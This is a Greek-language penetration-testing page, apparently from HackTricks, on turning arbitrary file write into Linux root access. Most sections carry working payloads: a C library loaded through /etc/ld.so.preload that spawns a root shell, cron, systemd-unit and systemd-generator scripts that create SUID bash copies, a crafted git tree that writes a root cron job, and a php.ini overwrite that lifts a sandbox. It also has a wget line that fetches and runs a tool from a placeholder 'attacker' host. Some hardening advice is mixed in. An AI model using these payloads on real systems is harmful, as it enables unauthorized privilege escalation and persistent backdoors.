# Αυθαίρετη εγγραφή αρχείων ως root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Το `/etc/ld.so.preload` είναι μια λίστα σε επίπεδο συστήματος με shared objects, τα οποία ο dynamic linker φορτώνει πριν από άλλα shared objects. Η λειτουργία secure-execution εφαρμόζει πρόσθετους περιορισμούς στο preloading, επομένως μια διαδρομή βιβλιοθήκης όπως η `/tmp/pe.so` δεν αποτελεί καθολική τεχνική για SUID-binary.\
Αν μπορείτε να δημιουργήσετε ή να τροποποιήσετε αυτό το αρχείο, μια διεργασία που το φορτώνει θα φορτώσει την καταχωρισμένη βιβλιοθήκη πριν από τα υπόλοιπα shared objects, επιτρέποντας την εκτέλεση κώδικα στο πλαίσιο αυτής της διεργασίας.<sup>[[12]](#references)</sup>

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

Τα **Git hooks** είναι εκτελέσιμα scripts που εκτελούνται σε συμβάντα ενός repository, όπως οι λειτουργίες commit και merge. Αν ένα **privileged script ή χρήστης** εκτελέσει αυτές τις ενέργειες και ένας attacker μπορεί να **γράψει στον φάκελο `.git`**, το hook μπορεί να χρησιμοποιηθεί για **privilege escalation**.<sup>[[13]](#references)</sup>

Για παράδειγμα, είναι δυνατό να **δημιουργηθεί ένα script** σε ένα git repo μέσα στο **`.git/hooks`**, ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privileged Git tree export path traversal

Ένας συγχρονιστής με αυξημένα προνόμια μπορεί να παρακάμπτει το checkout και, αντί γι’ αυτό, να απαριθμεί ένα repository που επηρεάζεται από attacker χρησιμοποιώντας `git ls-tree`, να διαβάζει κάθε blob με `git cat-file`, να συνενώνει το αναφερόμενο pathname με έναν staging directory και να γράφει ο ίδιος τα αρχεία. Αυτό οδηγεί σε **arbitrary file write με τα προνόμια του συγχρονιστή**, όταν συνδυάζει το `-c safe.directory=*` (απενεργοποιώντας την προστασία του Git για repository με διαφορετικό owner) με την απουσία ελέγχου ότι ο προορισμός παραμένει εντός του staging directory. Ένα απόλυτο όνομα tree entry κάνει το `os.path.join(stage, name)` της Python να αγνοεί το `stage`· ένα σχετικό όνομα που περιέχει `../` ξεφεύγει όταν το filesystem επιλύει τη διαδρομή. Επειδή η εφαρμογή δημιουργεί τα αρχεία απευθείας από το raw tree, αντί να ζητά από το Git να κάνει checkout, η απόρριψη pathname κατά το checkout δεν προστατεύει ποτέ τον προορισμό.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Αναζητήστε αυτό το μοτίβο κώδικα σε root services, timers, deployment agents, template importers και εργασίες backup/restore:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Μια εγγραφή tree κωδικοποιείται ως `<mode> SP <name> NUL <raw object ID>`. Η επιλογή `git hash-object --literally` επιτρέπει σκόπιμα δεδομένα object που μπορεί να απορρίψει η κανονική ανάλυση ή το `git fsck`, επομένως ένα προσωρινό clone μπορεί να δημιουργήσει ένα tree του οποίου το όνομα αρχείου είναι ένας απόλυτος προορισμός. Αυτό το παράδειγμα δημιουργεί ένα blob αρχείου cron, περικλείει το κατασκευασμένο tree σε ένα commit και μετακινεί ένα branch σε αυτό· η εκμετάλλευση εξακολουθεί να απαιτεί άδεια ενημέρωσης ενός repository που χρησιμοποιείται από την προνομιούχα εργασία και έναν Git server που αποδέχεται το κακοσχηματισμένο object.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Το hardening πρέπει να καλύπτει τόσο την εισαγωγή αποθετηρίων όσο και την τελική λειτουργία στο filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Αντικαταστήστε το `safe.directory=*` με τα ακριβή αποθετήρια που πρέπει να εμπιστεύεται η υπηρεσία και, όπου είναι δυνατό, εκτελείτε την επεξεργασία αποθετηρίων χωρίς δικαιώματα root.
- Απορρίψτε τα απόλυτα ονόματα και οποιοδήποτε στοιχείο `.` ή `..` πριν από την υλοποίηση. Μετά τη συνένωση, κανονικοποιήστε τη διαδρομή και επαληθεύστε ότι ο προορισμός παραμένει κάτω από τον προβλεπόμενο ριζικό κατάλογο.
- Αποφύγετε τις συνθήκες αγώνα symlink τύπου check-then-open: ανοίγετε σε σχέση με ένα έμπιστο file descriptor καταλόγου και, στο Linux, χρησιμοποιείτε `openat2()` με `RESOLVE_BENEATH` και `RESOLVE_NO_SYMLINKS` για διαδρομές που ελέγχονται από επιτιθέμενο.
- Προτιμήστε ένα κανονικό checkout σε απομονωμένο κατάλογο αντί να επανυλοποιήσετε το checkout από έξοδο plumbing. Αν απαιτείται εισαγωγή raw αντικειμένων, ενεργοποιήστε επικύρωση στην πλευρά της λήψης, όπως `receive.fsckObjects=true`· μην υποβαθμίζετε τα ευρήματα `receive.fsck.*` που σχετίζονται με ονόματα διαδρομών και απαιτούνται για την απόρριψη κατασκευασμένων δέντρων.

### Ανάπτυξη προνομιακής διαμόρφωσης

Ορισμένες υπηρεσίες διαχείρισης αποθηκεύουν την επιθυμητή κατάσταση του συστήματος σε ένα αρχείο διαμόρφωσης και αργότερα την αναπτύσσουν με αυξημένα προνόμια. Για παράδειγμα, το [openmediavault αποθηκεύει τη διαμόρφωση στο `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), και το [RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) μπορεί να εφαρμόζει αλλαγές υπηρεσιών. Αν ένας λογαριασμός με χαμηλότερα προνόμια μπορεί να γράψει ή να αντικαταστήσει αυτό το αρχείο, ελέγξτε αν μπορεί επίσης να ζητήσει εξουσιοδοτημένη ανάπτυξη και αν το επιλεγμένο module χρησιμοποιεί το τροποποιημένο πεδίο ως root. Τα κλειδιά λογαριασμών SSH, οι προγραμματισμένες εντολές και η εγκατάσταση πακέτων έχουν διαφορετικές προϋποθέσεις· η απλή παρουσία ενός αρχείου ή ένα εγγράψιμο αρχείο XML δεν αποδεικνύει τίποτα από αυτά. Ελέγξτε τα δικαιώματα του αρχείου και του γονικού καταλόγου, τις ομάδες του καλούντος και την εξουσιοδότηση RPC, την εγκατεστημένη έκδοση και τον πραγματικό consumer, χωρίς να επεξεργαστείτε τη διαμόρφωση ή να εκτελέσετε λειτουργία εφαρμογής κατά την καταγραφή.

Οι ορισμοί ενεργειών του Fail2Ban στο `/etc/fail2ban/action.d/` αποτελούν ένα ακόμη όριο προνομιακής διαμόρφωσης. Ένας χρήστης που μπορεί να γράψει σε αυτόν τον κατάλογο και να κάνει αναζήτηση σε αυτόν μπορεί ενδεχομένως να αντικαταστήσει έναν ορισμό ενέργειας ή να προσθέσει μια παράκαμψη, αλλά τα δικαιώματα του καταλόγου από μόνα τους δεν αποδεικνύουν εκτέλεση κώδικα. Επιβεβαιώστε ότι ένα ενεργοποιημένο jail επιλέγει πράγματι την επηρεαζόμενη ενέργεια, ότι η υπηρεσία Fail2Ban την εκτελεί με υψηλότερα προνόμια και ότι θα πραγματοποιηθούν εξουσιοδοτημένη επαναφόρτωση/επανεκκίνηση και συμβάν ban που ταιριάζει. Μια άσχετη άδεια sudo για επανεκκίνηση του Fail2Ban έχει σημασία μόνο αν αφορά την ακριβή κλήση της υπηρεσίας και φορτώνεται ο τροποποιημένος ορισμός. Η [διαμόρφωση ενεργειών του Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) τεκμηριώνει τη σχέση μεταξύ του καταλόγου ενεργειών και των jail· το [παράδειγμα ενέργειας](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) δείχνει ότι το `actionban` εκτελείται κατά το ban με τα δικαιώματα του χρήστη της υπηρεσίας. Ελέγξτε τα δικαιώματα και την ενεργή διαμόρφωση χωρίς να αλλάξετε ενέργειες ή να προκαλέσετε ban κατά την καταγραφή.

Υπάρχει ξεχωριστό όριο όταν ένα ενεργοποιημένο jail του Fail2Ban χρησιμοποιεί ενέργεια mail εμπλουτισμένη με WHOIS. Το [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) αφορούσε μη έμπιστο κείμενο WHOIS που διοχετευόταν στο GNU mailutils `mail`, του οποίου η επεξεργασία χαρακτήρων escape μπορούσε να εκτελέσει μια εντολή. Ένας χρήστης με χαμηλότερα προνόμια που μπορεί να γράφει αρχεία ενδέχεται να επηρεάσει την απόκριση αν μπορεί να αλλάξει τη διαμόρφωση παράκαμψης διακομιστή του **επιλεγμένου προγράμματος-πελάτη WHOIS**· το [`whois.conf(5)` του Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) τεκμηριώνει ένα τέτοιο αρχείο, αλλά η διαδρομή και η χρήση του διαφέρουν ανά εγκατάσταση. Ελέγξτε το ενεργό jail/action, την ταυτότητα της υπηρεσίας, το πραγματικό πρόγραμμα-πελάτη WHOIS και τη διαδρομή διαμόρφωσής του, την υλοποίηση mail, τον έλεγχο της απόκρισης και τη διορθωμένη έκδοση ή backport του προμηθευτή. Ένα εγγράψιμο αρχείο διαμόρφωσης WHOIS, μια έκδοση του Fail2Ban ή μια ενέργεια mail από μόνα τους δεν αποδεικνύουν αυτή την αλυσίδα· αποφύγετε ερωτήματα σε εξωτερικό διακομιστή ή την πρόκληση ban κατά την παθητική καταγραφή.

### Δημιουργία αρχείων TFTP και προνομιακά hooks πακέτων

Μια προσβάσιμη υπηρεσία TFTP μπορεί να διασχίσει όριο container ή τοπικού χρήστη όταν οι **ενεργές** ρυθμίσεις του tftpd-hpa εκτελούνται ως root, εκθέτουν τη ρίζα του filesystem ως κατάλογο `--secure` και ενεργοποιούν το `--create`. Το [εγχειρίδιο του tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) περιγράφει τις επιλογές δημιουργίας και χρήστη. Αυτό αποτελεί πιθανό τρόπο δημιουργίας νέου αρχείου σε προνομιακό κατάλογο διαμόρφωσης, συμπεριλαμβανομένου του `/etc/apt/apt.conf.d/`· ένα υπάρχον αρχείο ενδέχεται και πάλι να μην μπορεί να αντικατασταθεί. Το [εγχειρίδιο διαμόρφωσης του APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) τεκμηριώνει εντολές `APT::Update::Pre-Invoke`. Ένα `apt update` που εκτελείται ως root μπορεί να γίνει ο consumer με υψηλότερα προνόμια **μόνο αν** διαβάζει το νέο αρχείο διαμόρφωσης. Επιβεβαιώστε τα πραγματικά ορίσματα και την ταυτότητα της εκτελούμενης υπηρεσίας, την προσβασιμότητα και το φιλτράρισμα του δικτύου, την πολιτική δημιουργίας αρχείων στον κατάλογο-στόχο, το ενεργό εύρος της διαμόρφωσης του APT και μια μεταγενέστερη προνομιακή κλήση. Ένα προεπιλεγμένο αρχείο, ένας εγγράψιμος κατάλογος-στόχος ή μια προγραμματισμένη εντολή APT από μόνα τους δεν αποδεικνύουν ολόκληρη τη διαδρομή. Η παθητική διαλογή πρέπει να διαβάζει μόνο περιορισμένα τοπικά αρχεία διαμόρφωσης και μεταδεδομένα, χωρίς μεταφόρτωση αρχείου ή εκτέλεση του APT.

### Αρχεία Cron και ώρας

Αν μπορείτε να **γράψετε αρχεία σχετικά με το cron που εκτελεί το root**, συνήθως μπορείτε να πετύχετε εκτέλεση κώδικα την επόμενη φορά που θα εκτελεστεί η εργασία. Ενδιαφέροντες στόχοι περιλαμβάνουν:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Το crontab του root στο `/var/spool/cron/` ή στο `/var/spool/cron/crontabs/`
- Χρονοδιακόπτες `systemd` και οι υπηρεσίες που ενεργοποιούν

Γρήγοροι έλεγχοι:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Τυπικές διαδρομές κατάχρησης:

- **Προσθήκη νέας cron job για τον root** στο `/etc/crontab` ή σε αρχείο στο `/etc/cron.d/`
- **Αντικατάσταση ενός script** που εκτελείται ήδη από το `run-parts`
- **Τοποθέτηση backdoor σε έναν υπάρχοντα timer target** με τροποποίηση του script ή του binary που εκκινεί

Παράδειγμα ελάχιστου cron payload:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Αν μπορείς να γράψεις μόνο μέσα σε έναν κατάλογο cron που χρησιμοποιείται από το `run-parts`, άφησε εκεί ένα εκτελέσιμο αρχείο:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Σημειώσεις:

- Το `run-parts` συνήθως αγνοεί ονόματα αρχείων που περιέχουν τελείες, οπότε προτιμήστε ονόματα όπως `backup` αντί για `backup.sh`.<sup>[[15]](#references)</sup>
- Ορισμένα συστήματα χρησιμοποιούν `systemd` timers αντί για το κλασικό cron, αλλά η ιδέα της κατάχρησης είναι η ίδια: **τροποποιήστε αυτό που θα εκτελέσει αργότερα ο root**.<sup>[[20]](#references)</sup>

### Αρχεία Service & Socket

Αν μπορείτε να γράψετε **αρχεία unit του `systemd`** ή αρχεία στα οποία αυτά αναφέρονται, ενδέχεται να μπορέσετε να εκτελέσετε κώδικα ως root με επαναφόρτωση και επανεκκίνηση του unit ή περιμένοντας να ενεργοποιηθεί η υπηρεσία/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Ελέγξτε επίσης αν έχετε δικαιώματα εγγραφής και αναζήτησης στον ίδιο τον κατάλογο των system units, συμπεριλαμβανομένων των ACL: ένας χρήστης μπορεί να δημιουργήσει νέο unit στο `/etc/systemd/system` ακόμη κι όταν δεν επιτρέπεται η ανάγνωση ή η εμφάνιση των περιεχομένων του καταλόγου. Αυτή η διαδρομή από μόνη της δεν ξεκινά τίποτα. Επιβεβαιώστε ότι ο system manager θα φορτώσει το νέο unit, ότι ο χρήστης έχει δικαίωμα `systemctl start` ή `restart` με αποτελεσματικά προνόμια root για το όνομά του (ή άλλη διαδρομή προνομιακής ενεργοποίησης) και ότι η υπηρεσία εκτελείται με την επιθυμητή ταυτότητα. Ένα υπάρχον, ήδη φορτωμένο unit που τροποποιήθηκε στον δίσκο ενδέχεται να απαιτεί `daemon-reload`, ενώ ένα unit με νέο όνομα έχει διαφορετική συμπεριφορά φόρτωσης. Εξετάστε τα ακριβή ορίσματα και τις εξαιρέσεις του sudo πριν θεωρήσετε ότι ένας κανόνας επανεκκίνησης με wildcard αρκεί. Δείτε τη [διαδρομή αναζήτησης των systemd units](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) και τη [σημασιολογία φόρτωσης και επαναφόρτωσης του systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Ενδιαφέροντες στόχοι:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides στο `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/εκτελέσιμα υπηρεσιών στα οποία αναφέρονται τα `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Εγγράψιμες διαδρομές `EnvironmentFile=` που φορτώνονται από υπηρεσία root

Γρήγοροι έλεγχοι:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Συνήθεις τρόποι κατάχρησης:

- **Αντικατάσταση του `ExecStart=`** σε ένα service unit με ιδιοκτήτη τον root, το οποίο μπορείς να τροποποιήσεις
- **Προσθήκη drop-in override** με κακόβουλο `ExecStart=` και πρώτα εκκαθάριση του παλιού
- **Εγκατάσταση backdoor στο script/binary** που ήδη αναφέρεται στο unit
- **Παραβίαση μιας υπηρεσίας που ενεργοποιείται μέσω socket**, τροποποιώντας το αντίστοιχο αρχείο `.service` που εκκινείται όταν το socket λαμβάνει σύνδεση

Παράδειγμα κακόβουλου override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Τυπική ροή ενεργοποίησης:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Αν δεν μπορείς να επανεκκινήσεις τις υπηρεσίες μόνος σου, αλλά μπορείς να επεξεργαστείς μια μονάδα που ενεργοποιείται μέσω socket, ίσως αρκεί να **περιμένεις μια σύνδεση πελάτη** για να ενεργοποιηθεί η backdoored υπηρεσία ως root.<sup>[[17]](#references)</sup>

### Κατάλογοι systemd generator

Οι **System generators** είναι εκτελέσιμα αρχεία που εκκινούνται από τον system manager πριν φορτώσει τα unit files, τόσο κατά την εκκίνηση όσο και κατά την επαναφόρτωση της διαμόρφωσης. Επομένως, η δυνατότητα εγγραφής σε έναν κατάλογο system-generator (ή σε ένα υπάρχον εκτελέσιμο generator) αποτελεί άμεσο τρόπο εκτέλεσης κώδικα ως root, τον οποίο είναι εύκολο να παραβλέψει κανείς όταν ένας έλεγχος εξετάζει μόνο αρχεία `*.service` και `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Η συνηθισμένη σειρά αναζήτησης είναι `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` και `/usr/lib/systemd/system-generators/` (ορισμένες διανομές εκθέτουν το `/lib/systemd/system-generators/` μέσω της συγχώνευσης `/usr`). Ένα εκτελέσιμο με το ίδιο όνομα σε έναν κατάλογο που προηγείται στη σειρά αναζήτησης υπερισχύει του αντίστοιχου σε μεταγενέστερο κατάλογο. Μην συγχέεις αυτούς τους **καταλόγους εκτελέσιμων εισόδου** με τους `/run/systemd/generator`, `/run/systemd/generator.early` και `/run/systemd/generator.late`, οι οποίοι περιέχουν προσωρινά unit files που παράγονται από generators.<sup>[[35]](#references)</sup>

Γρήγοροι έλεγχοι:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Ένας νεοδημιουργημένος generator πρέπει να έχει ορισμένο το executable bit του. Αν το write primitive ελέγχει τα bytes αλλά όχι το mode, στόχευσε έναν ήδη executable generator· η περικοπή του επιτόπου συνήθως διατηρεί τα metadata του. Αν ο ίδιος ο κατάλογος είναι εγγράψιμος, δημιούργησε μια νέα εγγραφή και όρισέ την ως executable.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Η εκτέλεση του `systemctl daemon-reload` στον **system** manager απαιτεί κατάλληλη εξουσιοδότηση, αλλά επανεκτελεί κάθε system generator· διαφορετικά, περιμένετε μια reload με αυξημένα προνόμια, μια λειτουργία πακέτου ή μια επανεκκίνηση. Οι κατάλογοι user-generator, όπως ο `~/.config/systemd/user-generators/`, εκτελούνται στον user manager και **δεν** παρέχουν από μόνοι τους πρόσβαση root.<sup>[[35]](#references)</sup>

Για hardening και hunting, επαληθεύστε κάθε στοιχείο της διαδρομής και τα ACL, όχι μόνο τα τελικά mode bits, καταγράψτε ως baseline τα hashes/την ιδιοκτησία πακέτου των generators και ρυθμίστε ειδοποιήσεις για δημιουργία, μετονομασία, αλλαγές περιεχομένου ή δικαιωμάτων σε όλους τους καταλόγους εισόδου των system generators. Η παρακολούθηση της εγγραφής είναι σημαντική, επειδή ένας one-shot generator μπορεί να αυτοδιαγραφεί μετά την εκτέλεσή του, ενώ το παραγόμενο δέντρο μονάδων κάτω από το `/run/systemd/generator*` αναδημιουργείται στο επόμενο reload.<sup>[[35]](#references)[[36]](#references)</sup>

### Αντικατάσταση ενός περιοριστικού `php.ini` που χρησιμοποιείται από προνομιούχο PHP sandbox

Ορισμένοι προσαρμοσμένοι daemons επικυρώνουν PHP που παρέχεται από τον χρήστη, εκτελώντας την `php` με ένα **περιοριστικό `php.ini`** (για παράδειγμα, `disable_functions=exec,system,...`). Αν ο κώδικας στο sandbox εξακολουθεί να διαθέτει **οποιαδήποτε δυνατότητα εγγραφής** (όπως `file_put_contents`) και μπορείτε να αποκτήσετε πρόσβαση στην **ακριβή διαδρομή `php.ini`** που χρησιμοποιεί ο daemon, μπορείτε να **αντικαταστήσετε αυτήν τη ρύθμιση** για να άρετε τους περιορισμούς και, στη συνέχεια, να υποβάλετε ένα δεύτερο payload που εκτελείται με αυξημένα προνόμια.<sup>[[2]](#references)</sup>

Τυπική ροή:

1. Το πρώτο payload αντικαθιστά τη ρύθμιση sandbox.
2. Το δεύτερο payload εκτελεί κώδικα τώρα που οι επικίνδυνες συναρτήσεις έχουν ενεργοποιηθεί ξανά.

Ελάχιστο παράδειγμα (αντικαταστήστε τη διαδρομή που χρησιμοποιεί ο daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Αν ο daemon εκτελείται ως root (ή επικυρώνει με διαδρομές που ανήκουν στον root), η δεύτερη εκτέλεση αποκτά context root. Αυτό αποτελεί ουσιαστικά **privilege escalation μέσω config overwrite** όταν το sandboxed runtime μπορεί ακόμη να γράφει αρχεία.

### binfmt_misc

Το `binfmt_misc` εκθέτει registrations στο `/proc/sys/fs/binfmt_misc`· κάθε registration συσχετίζει ένα μοτίβο τύπου αρχείου με έναν interpreter. Ο αντίκτυπος στα προνόμια εξαρτάται από το ποιος μπορεί να αλλάξει το registration και ποια διεργασία εκτελεί αργότερα το αρχείο που ταιριάζει, επομένως επαληθεύστε αυτές τις προϋποθέσεις πριν θεωρήσετε ότι πρόκειται για διαδρομή privilege escalation.<sup>[[21]](#references)</sup>

Ένα εκτελέσιμο helper με `CAP_DAC_OVERRIDE` μπορεί να προσφέρει ξεχωριστή διαδρομή registration, αν δέχεται δεδομένα που ελέγχει ο caller και τα γράφει στο `/proc/sys/fs/binfmt_misc/register`, ακόμη κι όταν ο caller δεν μπορεί να γράψει απευθείας σε αυτό το node. Εξετάστε τη συμπεριφορά του helper ως προς την είσοδο και τις εγγραφές, χωρίς να το εκτελέσετε κατά την απαρίθμηση. Αν ένας καταχωρισμένος κανόνας χρησιμοποιεί το flag `C`, ο interpreter λαμβάνει credentials με βάση το binary που αντιστοιχίστηκε· επομένως, ένα SUID αρχείο που ανήκει στον root μπορεί να εκτελέσει έναν interpreter που ελέγχει ο caller ως root. Επιβεβαιώστε το mount και την πολιτική registration του `binfmt_misc`, την ενεργή capability του helper, τον ακριβή κανόνα και τη διαδρομή του interpreter, τον εκτελέσιμο SUID στόχο, καθώς και αν το `no_new_privs` ή ένα mount `nosuid` καταστέλλει τη μετάβαση SUID. Ένα capability bit ή μια ενσωματωμένη συμβολοσειρά διαδρομής από μόνα τους αποτελούν μόνο ένδειξη για περαιτέρω έλεγχο.<sup>[[21]](#references)</sup> Δείτε το [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) για τις συνθήκες καταστολής του SUID.

### Υπεργράψτε handlers σχημάτων (όπως http: ή https:)

Τα περιβάλλοντα desktop χρησιμοποιούν συσχετίσεις MIME και desktop entries για να επιλέξουν εφαρμογή για URI schemes· ένας attacker που μπορεί να γράψει στα σχετικά directories ρυθμίσεων ανά χρήστη και desktop-entry μπορεί να ανακατευθύνει αυτά τα schemes σε έναν launcher που ελέγχει. Τροποποιώντας το αρχείο `$HOME/.config/mimeapps.list` ώστε οι handlers URL HTTP και HTTPS να δείχνουν σε ένα κακόβουλο αρχείο (για παράδειγμα, `x-scheme-handler/http=evil.desktop` και `x-scheme-handler/https=evil.desktop`), ένα κλικ του χρήστη μπορεί να καλέσει αυτό το desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root εκτελεί scripts/δυαδικά αρχεία εγγράψιμα από τον χρήστη

Αν μια privileged workflow εκτελεί κάτι σαν `/bin/sh /home/username/.../script` (ή οποιοδήποτε δυαδικό αρχείο μέσα σε έναν κατάλογο που ανήκει σε μη προνομιούχο χρήστη), μπορείς να το hijack:<sup>[[1]](#references)</sup>

- **Εντοπισμός της εκτέλεσης:** παρακολούθησε τις διεργασίες με το pspy για να εντοπίσεις πότε το root εκτελεί διαδρομές που ελέγχονται από τον χρήστη.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Επιβεβαιώστε τη δυνατότητα εγγραφής:** βεβαιωθείτε ότι τόσο το αρχείο-στόχος όσο και ο κατάλογός του ανήκουν στον χρήστη σας ή είναι εγγράψιμα από αυτόν.
- **Κάντε hijack τον στόχο:** δημιουργήστε αντίγραφο ασφαλείας του αρχικού binary/script και τοποθετήστε ένα payload που δημιουργεί ένα SUID shell (ή εκτελεί οποιαδήποτε άλλη ενέργεια ως root) και, στη συνέχεια, επαναφέρετε τα δικαιώματα:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Ενεργοποιήστε την προνομιούχα ενέργεια** (π.χ. πατώντας ένα κουμπί UI που εκκινεί το helper). Όταν το root επανεκτελέσει το παραβιασμένο path, αποκτήστε το shell με αυξημένα δικαιώματα με `./rootshell -p`.

### Τροποποίηση αρχείων privileged binaries μόνο στο page cache

Ορισμένα kernel bugs δεν τροποποιούν το αρχείο **στον δίσκο**. Αντίθετα, σας επιτρέπουν να τροποποιήσετε μόνο το αντίγραφο του **page cache** ενός αναγνώσιμου αρχείου. Αν στοχεύσετε ένα **setuid** ή άλλο binary που εκτελείται από root, η επόμενη εκτέλεση μπορεί να χρησιμοποιήσει bytes που ελέγχει ο attacker από τη μνήμη και να κλιμακώσει τα δικαιώματα, παρόλο που το hash του αρχείου στον δίσκο παραμένει αμετάβλητο.<sup>[[3]](#references)[[4]](#references)</sup>

Αυτό είναι χρήσιμο να το σκεφτόμαστε ως **primitive εγγραφής αρχείου μόνο κατά τον χρόνο εκτέλεσης**:<sup>[[3]](#references)</sup>

- **Ο δίσκος παραμένει καθαρός**: το inode και τα bytes στον δίσκο δεν αλλάζουν
- **Η μνήμη είναι τροποποιημένη**: οι διεργασίες που διαβάζουν ή εκτελούν την cached page λαμβάνουν το περιεχόμενο που τροποποίησε ο attacker
- **Η επίδραση είναι προσωρινή**: η αλλαγή εξαφανίζεται μετά από reboot ή εκκαθάριση του cache

Αυτό το primitive βρίσκεται ανάμεσα στην κλασική **αυθαίρετη εγγραφή αρχείου** και σε παλαιότερα bugs **κατάχρησης του page cache**, όπως τα Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Το Dirty COW βασιζόταν σε race
- Το Dirty Pipe είχε περιορισμούς στη θέση εγγραφής
- Ένα primitive που περιορίζεται στο page cache μπορεί να είναι πιο αξιόπιστο, αν το ευάλωτο path επιτρέπει απευθείας εγγραφές σε cached σελίδες που υποστηρίζονται από αρχεία

#### Γενική ροή privesc

1. Αποκτήστε ένα kernel primitive που μπορεί να γράψει σε σελίδες του **file-backed page cache**
2. Χρησιμοποιήστε το εναντίον ενός **αναγνώσιμου προνομιούχου binary** ή άλλου αρχείου που εκτελείται από root
3. Ενεργοποιήστε την εκτέλεση **πριν απομακρυνθεί η σελίδα από το cache**
4. Αποκτήστε εκτέλεση κώδικα ως root, ενώ το αρχείο στον δίσκο εξακολουθεί να φαίνεται αμετάβλητο

